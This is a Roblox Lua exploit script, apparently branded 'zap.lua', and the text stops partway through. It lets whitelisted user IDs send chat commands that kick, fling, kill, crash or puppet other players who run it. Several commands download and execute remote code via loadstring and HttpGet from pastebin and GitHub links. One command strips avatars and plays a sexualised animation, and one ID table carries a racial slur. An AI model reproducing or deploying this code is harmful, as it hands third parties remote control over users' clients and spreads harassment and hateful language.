local StarId = {
	[244225295] = true,
	[3323076730] = true,
	[2557134457] = true,
	[2579528939] = true,
	[3234569780] = true,
	[739797913] = true,
	[554069643] = true,
	[704864053] = true,
	[882873696] = true,		
	[2788229376] = true,
	[180050164] = true,
	[2530475931] = true,
	[2752617727] = true,
	[244802002] = true,
	[244136742] = true,
	[1518463663] = true,
	[3433248744] = true,
	[951256602] = true,
	[1641670824] = true,
	[1604265463] = true,
	[3333530481] = true,
	[53253037] = true,
	[3173996460] = true,
	[1866985431] = true,
	[3476601774] = true,
	[1046414679] = true,
	[3512136498] = true,
	[3305299944] = true,
	[2852027353] = true,
	[676955456] = true,
	[3539736494] = true,
	[240985494] = true,
	[275110986] = true,
	[1683405654] = true,
	[1728370995] = true,
	[336894935] = true,
}

local StaffId = {}

local AdminId = {
	[1090807044] = true,
	[2452452863] = true,
	[3449237561] = true,
	[1217455689] = true,
}

local NiggaId = {
	[3325255687] = true,
	[3250210145] = true,
}

function premium()
	for _,v in pairs(game:GetService('Players'):GetChildren()) do
		if StaffId[v.UserId] then
			if v.Character then
				if v.Character.Parent.Name == 'Players' then
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]'..v.DisplayName)
				end
			local freeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
		end
		
		local unfreeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
		end
		
		v.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer:Kick("                                Kicked by Premium.")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$fling .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
					power = 99999999 -- change this to make it more or less powerful
		 
					game:GetService('RunService').Stepped:connect(function()
					game.Players.LocalPlayer.Character.Head.CanCollide = false
					game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
					game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
					game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
					end)
					wait(.1)
					local bambam = Instance.new("BodyThrust")
					bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
					bambam.Force = Vector3.new(power,0,power)
					bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
				end
			end
		
		end)
		
			v.Chatted:connect(function(cht)
			if cht:match("$benx .") then
				if game.Players.LocalPlayer ~= v then
					wait(0)
					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = v.Character.HumanoidRootPart
					local benxed = true
					while benxed == true do
						hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
						pcall(function()
								hummy.Parent.Pants:Destroy()
						end)
						pcall(function()
								hummy.Parent.Shirt:Destroy()
						end)
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame + v.Character.HumanoidRootPart.CFrame.lookVector * 0.5
						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
						wait(0.1)
						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
						for i,v in pairs(game:GetService('Players'):GetChildren()) do
                        AnimationId = "3152394906"
                        local Anim = Instance.new("Animation")
                        Anim.AnimationId = "rbxassetid://"..AnimationId
                        local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
                        k:Play()
                        end
					end
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unbenx .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
					wait(8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$freeze .") then
				if game.Players.LocalPlayer ~= v then
					freeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unfreeze .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$thaw .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$ban .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer:kick("PERMA BAN")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$kill .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$rejoin .") then
				if game.Players.LocalPlayer ~= v then
				loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$void .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$bring .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$grave .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
					game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$ungrave .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
					wait(0.1)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("/e test") then
				if game.Players.LocalPlayer ~= v then
					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yessir!!!!","All")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$dropcash .") then
				if game.Players.LocalPlayer ~= v then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
				end
			end
		
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$crash .") then
				if game.Players.LocalPlayer ~= v then
				game:Shutdown()
				end
	    end
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$jumpscare .") then
				if game.Players.LocalPlayer ~= v then
				    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/jumpscare.lua"))()
				end
			end
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$refresh .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
					wait(8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$animate") then
				if game.Players.LocalPlayer ~= v then
								while true do
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] z4')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] za')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] za7')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.1')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.l')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.lv')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.lu')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.lu4')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.lua')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] discord.gg/zp')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.lu')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.lu')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.l')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] za')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] z')
								wait(1)
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] ')
								wait(1)
					end
				end
			end
		end)
		v.Chatted:connect(function(cht)
		if cht:match("$pray .") then
			if game.Players.LocalPlayer ~= v then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/pray.lua'))()
			end
		end
		end)
		
		v.Chatted:connect(function(cht)
		if cht:match("$say") then
			if game.Players.LocalPlayer ~= v then
			SplitString = cht:split(" ")
			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SplitString[2],"All")
			end
		end
	end)

	v.Chatted:connect(function(cht)
		if cht:match("$rename") then
			if game.Players.LocalPlayer ~= v then
			SplitString = cht:split(" ")
			renaming = true
			while renaming == true do
			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = (SplitString[2])
			wait(0.1)
			end
		end
	end
	end)
	
	v.Chatted:connect(function(cht)
		if cht:match("$unrename") then
			if game.Players.LocalPlayer ~= v then
			renaming = false
			if StarId[v.UserId] then
		    v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]'..v.DisplayName)
			elseif StaffId[v.UserId] then
            v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]'..v.DisplayName)
			elseif AdminId[v.UserId] then
			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]'..v.DisplayName)
			end
		end
	end
	end)
	
	v.Chatted:connect(function(cht)
		if cht:match("$headless") then
			if game.Players.LocalPlayer ~= v then
			    v.Character.Head.Transparency = 1
                for i,v in pairs(v.Character.Head:GetChildren()) do
                if (v:IsA("Decal")) then
                    v:Destroy()
                    end
                end
			end
	    end
	end)
	
	v.Chatted:connect(function(cht)
		if cht:match("$korblox") then
			if game.Players.LocalPlayer ~= v then
	            local chr = v.Character
                chr.RightLowerLeg.MeshId = "902942093"
	            chr.RightLowerLeg.Transparency = "1"
	            chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
	            chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
	            chr.RightFoot.MeshId = "902942089"
	            chr.RightFoot.Transparency = "1"
			end
	    end
	end)

end
		elseif StarId[v.UserId] then
			if v.Character then
				if v.Character.Parent.Name == 'Players' then
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]'..v.DisplayName)
				end
local freeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
		end
		
		local unfreeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
		end
		
		v.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer:Kick("                                Kicked by Premium.")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$fling .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
					power = 99999999 -- change this to make it more or less powerful
		 
					game:GetService('RunService').Stepped:connect(function()
					game.Players.LocalPlayer.Character.Head.CanCollide = false
					game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
					game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
					game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
					end)
					wait(.1)
					local bambam = Instance.new("BodyThrust")
					bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
					bambam.Force = Vector3.new(power,0,power)
					bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
				end
			end
		
		end)
		
			v.Chatted:connect(function(cht)
			if cht:match("$benx .") then
				if game.Players.LocalPlayer ~= v then
					wait(0)
					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = v.Character.HumanoidRootPart
					local benxed = true
					while benxed == true do
						hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
						pcall(function()
								hummy.Parent.Pants:Destroy()
						end)
						pcall(function()
								hummy.Parent.Shirt:Destroy()
						end)
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame + v.Character.HumanoidRootPart.CFrame.lookVector * 0.5
						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
						wait(0.1)
						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
						for i,v in pairs(game:GetService('Players'):GetChildren()) do
                        AnimationId = "3152394906"
                        local Anim = Instance.new("Animation")
                        Anim.AnimationId = "rbxassetid://"..AnimationId
                        local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
                        k:Play()
                        end
					end
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unbenx .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
					wait(8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$freeze .") then
				if game.Players.LocalPlayer ~= v then
					freeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unfreeze .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$thaw .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$ban .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer:kick("PERMA BAN")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$kill .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$rejoin .") then
				if game.Players.LocalPlayer ~= v then
				loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$void .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$bring .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$grave .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
					game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$ungrave .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
					wait(0.1)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("/e test") then
				if game.Players.LocalPlayer ~= v then
					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yessir!!!!","All")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$dropcash .") then
				if game.Players.LocalPlayer ~= v then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
				end
			end
		
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$crash .") then
				if game.Players.LocalPlayer ~= v then
				game:Shutdown()
				end
	    end
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$jumpscare .") then
				if game.Players.LocalPlayer ~= v then
				    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/jumpscare.lua"))()
				end
			end
		
		end)
		v.Chatted:connect(function(cht)
			if cht:match("$refresh .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
					wait(8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		end)
		v.Chatted:connect(function(cht)
		if cht:match("$pray .") then
			if game.Players.LocalPlayer ~= v then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/pray.lua'))()
			end
		end
		end)

		v.Chatted:connect(function(cht)
		if cht:match("$say") then
			if game.Players.LocalPlayer ~= v then
			SplitString = cht:split(" ")
			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SplitString[2],"All")
			end
		end
	end)

	v.Chatted:connect(function(cht)
		if cht:match("$rename") then
			if game.Players.LocalPlayer ~= v then
			SplitString = cht:split(" ")
			renaming = true
			while renaming == true do
			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = (SplitString[2])
			wait(0.1)
			end
		end
	end
	end)
	
	v.Chatted:connect(function(cht)
		if cht:match("$unrename") then
			if game.Players.LocalPlayer ~= v then
			renaming = false
			if StarId[v.UserId] then
		    v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]'..v.DisplayName)
			elseif StaffId[v.UserId] then
            v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]'..v.DisplayName)
			elseif AdminId[v.UserId] then
			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]'..v.DisplayName)
			end
		end
	end
	end)
	
	v.Chatted:connect(function(cht)
		if cht:match("$headless") then
			if game.Players.LocalPlayer ~= v then
			    v.Character.Head.Transparency = 1
                for i,v in pairs(v.Character.Head:GetChildren()) do
                if (v:IsA("Decal")) then
                    v:Destroy()
                    end
                end
			end
	    end
	end)
	
	v.Chatted:connect(function(cht)
		if cht:match("$korblox") then
			if game.Players.LocalPlayer ~= v then
	            local chr = v.Character
                chr.RightLowerLeg.MeshId = "902942093"
	            chr.RightLowerLeg.Transparency = "1"
	            chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
	            chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
	            chr.RightFoot.MeshId = "902942089"
	            chr.RightFoot.Transparency = "1"
			end
	    end
	end)

end
		elseif AdminId[v.UserId] then
			if v.Character then
				if v.Character.Parent.Name == 'Players' then
					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]'..v.DisplayName)
				end
local freeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
		end
		
		local unfreeze = function()
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
			game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
		end
		
		v.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer:Kick("                                Kicked by Premium.")
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$fling .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
					power = 99999999 -- change this to make it more or less powerful
		 
					game:GetService('RunService').Stepped:connect(function()
					game.Players.LocalPlayer.Character.Head.CanCollide = false
					game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
					game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
					game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
					end)
					wait(.1)
					local bambam = Instance.new("BodyThrust")
					bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
					bambam.Force = Vector3.new(power,0,power)
					bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
				end
			end
		
		end)
		
			v.Chatted:connect(function(cht)
			if cht:match("$benx .") then
				if game.Players.LocalPlayer ~= v then
					wait(0)
					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = v.Character.HumanoidRootPart
					local benxed = true
					while benxed == true do
						hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
						pcall(function()
								hummy.Parent.Pants:Destroy()
						end)
						pcall(function()
								hummy.Parent.Shirt:Destroy()
						end)
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame + v.Character.HumanoidRootPart.CFrame.lookVector * 0.5
						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
						wait(0.1)
						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
						for i,v in pairs(game:GetService('Players'):GetChildren()) do
                        AnimationId = "3152394906"
                        local Anim = Instance.new("Animation")
                        Anim.AnimationId = "rbxassetid://"..AnimationId
                        local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
                        k:Play()
                        end
					end
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unbenx .") then
				if game.Players.LocalPlayer ~= v then
					game.Players.LocalPlayer.Character.Humanoid:Destroy()
					wait(8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$freeze .") then
				if game.Players.LocalPlayer ~= v then
					freeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$unfreeze .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
		v.Chatted:connect(function(cht)
			if cht:match("$thaw .") then
				if game.Players.LocalPlayer ~= v then
					unfreeze()
				end
			end
		
		end)
		
v.Chatted:connect(function(cht)
	if cht:match("$ban .") then
		if game.Players.LocalPlayer ~= v then
			game.Players.LocalPlayer:kick("PERMA BAN")
		end
	end
end)
		
v.Chatted:connect(function(cht)
	if cht:match("$kill .") then
		if game.Players.LocalPlayer ~= v then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
		end
	end
end)
		
v.Chatted:connect(function(cht)
    if cht:match("$rejoin .") then
		if game.Players.LocalPlayer ~= v then
			loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
		end
	end
end)
		
v.Chatted:connect(function(cht)
	if cht:match("$void .") then
		if game.Players.LocalPlayer ~= v then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
		end
	end
end)

v.Chatted:connect(function(cht)
	if cht:match("$bring .") then
		if game.Players.LocalPlayer ~= v then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
		end
	end
end)
	
v.Chatted:connect(function(cht)
	if cht:match("$grave .") then
		if game.Players.LocalPlayer ~= v then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
		end
	end
end)
v.Chatted:connect(function(cht)
if cht:match("$ungrave .") then
	if game.Players.LocalPlayer ~= v then
		game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
		wait(0.1)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
		end
	end
end)
		
v.Chatted:connect(function(cht)
	if cht:match("/e test") then
		if game.Players.LocalPlayer ~= v then
			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yessir!!!!","All")
		end
	end
end)
		
v.Chatted:connect(function(cht)
	if cht:match("$dropcash .") then
	if game.Players.LocalPlayer ~= v then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
		end
	end
end)
v.Chatted:connect(function(cht)
	if cht:match("$crash .") then
		if game.Players.LocalPlayer ~= v then
			game:Shutdown()
		end
    end
end)
v.Chatted:connect(function(cht)
	if cht:match("$jumpscare .") then
		if game.Players.LocalPlayer ~= v then
		    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/jumpscare.lua"))()
		end
	end
end)
v.Chatted:connect(function(cht)
	if cht:match("$refresh .") then
			if game.Players.LocalPlayer ~= v then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
			wait(8)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
		end
	end
end)
v.Chatted:connect(function(cht)
	if cht:match("$animate") then
		if game.Players.LocalPlayer ~= v then
			while true do
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] z4')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] za')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] za7')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.1')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.l')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lv')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lu')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lu4')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lua')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] discord.gg/zp')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lu')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lu')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.l')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] za')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] z')
				wait(1)
				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]')
				wait(1)
			end
		end
	end
end)

v.Chatted:connect(function(cht)
	if cht:match("$pray .") then
		if game.Players.LocalPlayer ~= v then
		loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/pray.lua'))()
		end
	end
end)
	v.Chatted:connect(function(cht)
	if cht:match("$say") then
		if game.Players.LocalPlayer ~= v then
		SplitString = cht:split(" ")
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SplitString[2],"All")
		end
	end
end)
v.Chatted:connect(function(cht)
	if cht:match("$rename") then
		if game.Players.LocalPlayer ~= v then
		SplitString = cht:split(" ")
		renaming = true
		while renaming == true do
		v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = (SplitString[2])
		wait(0.1)
		end
	end
end
end)

v.Chatted:connect(function(cht)
